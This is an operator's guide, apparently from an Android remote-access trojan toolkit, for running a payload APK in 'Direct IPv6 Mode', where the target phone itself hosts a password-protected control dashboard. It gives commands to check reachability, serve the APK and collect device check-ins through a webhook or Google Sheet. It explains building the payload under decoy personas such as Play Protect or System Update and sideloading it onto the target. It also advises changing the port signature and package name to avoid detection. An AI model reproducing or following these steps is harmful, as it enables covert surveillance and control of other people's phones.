# 12 ⏤ Direct IPv6 Server Setup

> This guide provides complete instructions for operating in **Direct IPv6 Mode (Path C)** where no cloud relay backend is required—the target Android device itself acts as the C2 web server on port **9191**.

---

## 📌 When to Use This Setup

### When to use it:
- The target device is assigned a publicly routable global IPv6 address by its carrier or Wi-Fi network, and you want direct peer-to-peer control without deploying a cloud relay server.
### When NOT to use it:
- The target is behind an aggressive carrier firewall that blocks inbound ports, or is on an IPv4-only / NAT64 network. (In those cases, use **Render.com Relay Deployment** described in `03-C2_Deployment.md`).
### What "Server Config" means here:
- Because the payload app runs its own HTTP server directly on the Android device, there is no external backend to deploy. Server setup consists of verifying network reachability, configuring discovery webhooks, hosting the installer APK, and connecting directly.

---

## 0. Pre-Flight Requirements

Before building anything, run these pre-flight checks:

- [ ] **Address Check:** The target network assigns a `2xxx:` or `3xxx:` address (`ip -6 addr show scope global`).
- [ ] **NAT64 Check:** Target network is not operating strictly on NAT64 without inbound IPv6 routing.
- [ ] **Port Reachability:** Port `9191` on an IPv6 host can be reached from outside its local LAN.
- [ ] **Host Address:** Your build host or distribution server has a public IPv6 address (if hosting the installer APK locally).
- [ ] **Access Acceptance:** You accept that the target device will be internet-facing with password authentication.

---

## 1. Confirm the Device Has a Routable Address

Check the device's assigned IPv6 addresses via ADB or terminal:

```bash
adb shell ip -6 addr show scope global
```

### Address Classification & Rules:
- **`2xxx:` / `3xxx:`**: **Global Unicast Address (GUA)** — Publicly routable address required for direct connections.
- **`fe80::`**: **Link-Local Address** — Only valid within the local subnet; cannot be reached over the internet.
- **`fd00::`**: **Unique Local Address (ULA)** — Internal site/LAN address; not routable over the public internet.
- **No address**: IPv6 is disabled or not provisioned by the mobile network operator / ISP.

> ⚠️ **Privacy Extensions Notice**: Modern Android builds rotate the last 64 bits (interface identifier) of GUAs periodically (e.g., daily) while retaining the `/64` prefix (`2001:db8:.../64`). Direct IP connections will change when the address rotates.

---

## 2. Verify Inbound Reachability (The Three Gates)

To verify that inbound traffic can reach the device, pass all three test gates sequentially:

### Gate 1 — Device-Side Local Binding Check
Verify the payload's local C2 web server is listening on port `9191`:
```bash
adb shell "curl -s -o /dev/null -w '%{http_code}' http://[::1]:9191/"
```
* **Expected Result:** `200` indicates the web server is active on the device. Any other response points to a payload startup or permission issue rather than a network block.

### Gate 2 — Same-LAN Reachability Check
Test reachability from another device connected to the same Wi-Fi network:
```bash
curl -i "http://[<target-v6-address>]:9191/"
```
* **Expected Result:** `200 OK` with the login screen HTML.
* **Troubleshooting:** A **Timeout** indicates Access Point (AP) client isolation (common on guest Wi-Fi and captive portals). Disable AP isolation or test on a different network.

### Gate 3 — Off-LAN / Carrier Firewall Reachability Check
Test reachability from an external network (e.g., a workstation tethered to a separate mobile data connection):
```bash
curl -i --max-time 10 "http://[<target-v6-address>]:9191/"
```
* **Troubleshooting Carrier Block:** If Gates 1 and 2 pass but Gate 3 times out, the cellular carrier is filtering inbound IPv6 traffic.
* **Resolutions:**
  1. Switch to a carrier/SIM that permits inbound IPv6 connections.
  2. Connect the target device to a Wi-Fi network with open inbound routing.
  3. Switch from Direct Mode to **Render Relay Mode** (`03-C2_Deployment.md`).

---

## 3. Host the APK on a V6-Reachable Host

To deliver the compiled APK to the target device, serve the file over HTTP from an IPv6-accessible server.

### Local Python HTTP Server
Serve the APK from your workstation using Python, specifying the proper MIME type (`application/vnd.android.package-archive`) so mobile browsers download the APK instead of rendering binary text:

```bash
# Serve current directory on port 8080 over IPv6
python3 -c "import http.server, socketserver, socket; handler = http.server.SimpleHTTPRequestHandler; handler.extensions_map.update({'.apk': 'application/vnd.android.package-archive'}); socketserver.TCPServer.address_family = socket.AF_INET6; socketserver.TCPServer(('::', 8080), handler).serve_forever()"
```

### Host & Firewall Configuration
Ensure port `8080` (and `9191` if managing from the same machine) is open in your host and cloud firewall:

```bash
# Uncomplicated Firewall (UFW)
sudo ufw allow 8080/tcp
sudo ufw allow 9191/tcp

# ip6tables
sudo ip6tables -A INPUT -p tcp --dport 8080 -j ACCEPT
```

> [!IMPORTANT]
> If hosting on a cloud VM (AWS, Oracle, DigitalOcean), also open TCP port `8080` in your Cloud Security Group / Inbound Rules.

---

## 4. Configure the Webhook for Discovery

When operating in Direct IPv6 mode, the target device needs a way to report its assigned IPv6 address upon check-in. Choose one of the following options:

### Option 4a — No Receiver (Physical / Local Access Only)
If you have local physical access or ADB access to the target device, omit the C2 Webhook URL during build. You can retrieve the assigned IPv6 address directly using:
```bash
adb shell ip -6 addr show scope global
```

### Option 4b — Minimal HTTP Receiver
Host a minimal HTTP endpoint to capture incoming POST check-in payloads containing the device's IPv6 address, port, battery, and status:
```bash
# Example check-in payload format:
# {"device":"Pixel 7","ip":"2001:db8::1","port":"9191","battery":"85%","network":"Cellular"}
```

### Option 4c — Google Sheets Logging Webhook
Use a **free Google Apps Script web app** to log device check-ins directly into a Google Sheet:
1. Open [Google Sheets](https://docs.google.com/spreadsheets/) and create a new spreadsheet.
2. Click **Extensions** $\rightarrow$ **Apps Script**.
3. Paste the Apps Script code from `03-C2_Deployment.md` and click **Deploy** $\rightarrow$ **New deployment**.
4. Set **Who has access** (your E-mail) $\rightarrow$ **Anyone**. **Copy the published Web App URL and use it as your C2 Webhook URL**.

---

## 5. Build

Build the signed payload APK using the automated wizard:

```bash
cd apk-builder
chmod +x build.sh
./build.sh
```

Follow the interactive prompts:
1. Select **Option 1 (Build Payload)**.
2. Choose a **Decoy Persona** (e.g. Play Protect, Calculator, Weather, System Update).
3. Enter your **C2 Webhook URL** (or leave blank if using physical access).
4. Set your **C2 Password** (default: `admin1337`).

The **build wizard** outputs the final compiled binary to `apk-builder/output/`.

---

## 6. Deliver and Install

Deliver the APK to the target device:

### Option A: Direct Web Download
Direct the target device's web browser to your hosted IPv6 download URL:
`http://[<your-host-ipv6>]:8080/signed_v1.apk`

### Option B: ADB Sideload
If connected via USB or wireless ADB:
```bash
adb install -r apk-builder/output/signed_v1.apk
adb shell am start -n <package_id>/.MainActivity
```

---

## 7. Connect

Once the device checks in:

1. Open your web browser on your workstation.
2. Navigate to your C2 Server on Render (`https://your-c2.onrender.com`) or direct address `http://[<target-ipv6-address>]:9191/`.
3. Enter the C2 password (default: `admin1337` or value of `C2_PASSWORD` in `.env`) to access the full 13-tab control dashboard.
4. Upon authentication, the server sets strict `HttpOnly` JWT `access_token` and `refresh_token` cookies.

---

## 8. Changing the Port (Optional)

Port `9191` is the default port and can serve as a signature. To change the listening port:

1. Search for instances of `9191` across the source codebase:
   ```bash
   grep -rn "9191" app/src/main/java/com/labs/labrats/
   ```
2. Update the default port constant in `FirebaseConfig.java` (e.g., to `38491`).
3. Ensure the three key locations match:
   - The local web server bind port.
   - The advertised check-in URL payload port.
   - The `build.sh` default configuration.
4. Rebuild the APK.

---

## 9. Stable Naming (Optional)

To avoid managing raw IPv6 strings:

- **DNS AAAA Record:** Map your custom domain or subdomain to the target's IPv6 address using a DNS `AAAA` record (`http://target.yourdomain.com:9191`).
- **Dynamic DNS (DDNS):** If privacy extensions rotate the device's interface identifier daily, use a DDNS service (e.g., DuckDNS) to update the `AAAA` record automatically upon check-in.
- **IPv4 Warning:** Do not use standard IPv4 `A` records, as no IPv4 listener is bound in Direct IPv6 mode.

---

## 10. Security Hardening & Environment Configuration

When deploying the C2 Server (e.g. on Render) or exposing port `9191`:

1. **Configure Environment Secrets (`.env`):** Set strong, unique values in your environment variables:
   ```env
   C2_PASSWORD=YourStrongCustomPassword2026
   ACCESS_SECRET=your_jwt_access_secret_key_32_chars_long
   REFRESH_SECRET=your_jwt_refresh_secret_key_32_chars_long
   NODE_ENV=production
   ```
2. **Enable Trust Proxy on Reverse Proxies:** Ensured `app.set('trust proxy', 1)` is enabled in `server.js` for Render reverse-proxy rate limiting and secure HttpOnly cookies.
3. **Change Default Password:** Change `admin1337` immediately upon first login via **Terminal** $\rightarrow$ **Secure Login**.
4. **Restrict Public Exposure:** Use SSH tunneling (`ssh -N -L 9191:[<target-v6>]:9191 user@server`) or a TLS reverse proxy (Caddy / Nginx) to encrypt communications.
5. **Custom Package Name:** Set a unique `PKG_NAME` in `local.properties` before compilation to avoid detection.
